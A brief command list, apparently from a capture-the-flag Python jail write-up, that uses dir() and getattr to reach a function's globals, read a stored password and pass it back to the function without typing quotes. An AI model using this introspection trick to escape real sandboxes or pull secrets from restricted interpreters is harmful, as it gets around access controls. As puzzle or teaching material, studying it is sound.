Commands List
-------------

Here we check in `func_globals`
Also we use `getattr`

print(dir(getout))
print(getattr(getout,dir(getout)[-2]))   # We see passwd as a global variable
print(getout(getattr(getout, dir(getout)[-2])[list(getattr(getout, dir(getout)[-2]))[-7]]))  # Use the value of passwd as parameter for getout as we can't use quotes hence the long way